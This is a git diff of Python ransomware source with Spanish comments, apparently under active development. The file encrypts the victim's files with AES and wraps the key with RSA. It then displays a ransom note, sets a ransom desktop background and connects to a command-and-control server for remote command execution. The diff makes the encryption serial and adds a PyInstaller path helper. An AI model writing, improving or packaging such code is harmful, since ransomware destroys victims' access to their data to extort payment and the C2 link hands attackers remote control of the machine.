@@ -1,6 +1,5 @@
 import os
 import ctypes
-import multiprocessing
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from find_files import find_files
@@ -8,6 +7,19 @@ import gen_keys
 import antianalysis
 import agent
 import note
+import sys
+
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS  # Si está empaquetado con PyInstaller
+    except Exception:
+        base_path = os.path.abspath(".")
+
+    return os.path.join(base_path, relative_path)
+
+def change_background():
+    image_path = resource_path("background.png")
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
 
 def load_aes_key():
     with open("aes_key.bin", "rb") as f:
@@ -16,7 +28,7 @@ def load_aes_key():
 def load_rsa_public_key():
     with open("rsa_public.pem", "rb") as f:
         return RSA.import_key(f.read())
-    
+
 def encrypt_aes_key(rsa_public_key, aes_key):
     cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
     aes_key_encrypted = cipher_rsa.encrypt(aes_key)
@@ -43,9 +55,8 @@ def encrypt_files():
     files = find_files()  # Obtener lista de archivos a cifrar
     gen_keys.generate_aes_key()  # Generar clave simétrica
     aes_key = load_aes_key()  # Cargar la clave simétrica
-    with multiprocessing.Pool(processes=os.cpu_count()) as pool:
-        # Usa un pool de procesos para cifrar los archivos en paralelo
-        pool.starmap(encrypt_file, [(file, aes_key) for file in files]) 
+    for file in files:
+        encrypt_file(file, aes_key)
     print("Archivos cifrados correctamente.")
     gen_keys.generate_rsa_key() # Generar par de claves RSA
     rsa_public_key = load_rsa_public_key() # Cargar clave pública RSA
@@ -57,8 +68,6 @@ def encrypt_files():
     note.show_note() # Mostrar nota de rescate personalizada en escritorio
     agent.connect_to_c2_server() # Conexión con servidor C2 para ejecución remota de comandos
 
-def change_background():
-    image_path = os.path.abspath("background_image/background.png")
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3) 
+
 
 
